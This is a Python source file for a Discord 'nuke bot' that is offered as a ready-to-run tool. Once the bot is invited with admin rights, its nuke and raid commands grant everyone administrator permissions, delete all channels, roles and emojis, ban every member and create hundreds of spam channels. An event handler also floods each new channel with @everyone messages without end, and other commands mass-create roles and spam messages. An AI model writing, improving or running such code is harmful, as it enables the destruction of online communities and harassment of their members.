import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

p = input(f"{Fore.BLUE}Your Bot Prefix: ")
client = commands.Bot(command_prefix=p)
user_id = input(f"{Fore.GREEN}Your user id: ")
token = input(f"{Fore.RED}Your Bot Token: {Fore.RESET}")
print(f"{Fore.GREEN}code by ArchaicDaisy")
print(f"{Fore.BLUE}loading your bot...")
print(F"{Fore.RED}1%")
print(f"{Fore.RED}10%")
print(f"{Fore.RED}20%")
print(f"{Fore.RED}30%")
print(f"{Fore.RED}40%")
print(f"{Fore.RED}50%")
print(f"{Fore.RED}60%")
print(f"{Fore.RED}70%")
print(f"{Fore.RED}80%")
print(f"{Fore.RED}90%")
print(f"{Fore.RED}100%")
print(f"{Fore.GREEN}READY")

SPAM_CHANNEL =  ["nuke by DFC"]
SPAM_MESSAGE = [f" @everyone\n Discord Nuke Bot 2.0\n https://i.imgflip.com/5yiwpc.gif"]

@client.event
async def on_ready():
    print(f'/+========================================================')
    print(f'| | {Fore.GREEN}Bot ready.')
    print(f'| {Fore.MAGENTA}+ Logged in as')
    print(f'| {Fore.MAGENTA}+ TOKEN = {token}')
    print(f'| | {client.user.name}# {client.user.discriminator}')
    print(f'| | {client.user.id}')
    print(f'| |https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot')
    print('| ~*************************************')
    print('\\+========================================================')
    await client.change_presence(activity=discord.Game(name=f"coding {client.user}"))

@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name="Discord Nuke Bot 2.0")
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("YOUR_USERNAME_AND_TAG")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel(":)) nuke")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@client.command()
async def ping(ctx):
	embed = discord.Embed(title="Pong!",
	                      description=f"``{round(client.latency * 1000)}ms! ✅``",
	                      color=00000)
	await ctx.send(embed=embed)

@client.command()
async def say(ctx,*,content):
    await ctx.send(content)

@client.command()
async def spamrole(ctx):
    if ctx.author.id == user_id:
        a = 1
        while a < 200:
            await ctx.guild.create_role(name="NUKE")
            print(f"{a} roles created")
            a += 1
    else:
        pass

@client.command()
async def spamch(ctx):
    if ctx.author.id == user_id:
        a = 1
        while a < 60:
            await ctx.guild.create_text_channel("get nuked")
            print(f"{a} channels created")
            a += 1
    else:
        pass

@client.command()
async def raid(ctx):
    # First check if the author is executing command

    if ctx.author.id == user_id:
        # Proceed command
        guild = client.get_guild(ctx.guild.id)

        for role in guild.roles:
            try:
                await role.delete()
                print(f"Deleted role: {role}")
            except:
                print(f"Cant delete role: {role}")
                pass

        for member in guild.members:
            try:
                await member.ban(reason="nuke")
                print(f"Banned member: {member}")
            except:
                print(f"Cant ban member: {member}")
                pass

        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel}")
            except:
                print(f"Cant delete channel: {channel}")
                pass

        await ctx.guild.create_text_channel("Nuke BY DFC")
    else:
        pass

@client.command()
async def spam(ctx, *, message):
  if ctx.author.id == user_id:
    global raid
    raid = True
    while raid:
      await ctx.send(message)

@client.command()
async def stopspam(ctx):
  if ctx.author.id == user_id:  
      global raid
      raid = False 

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)
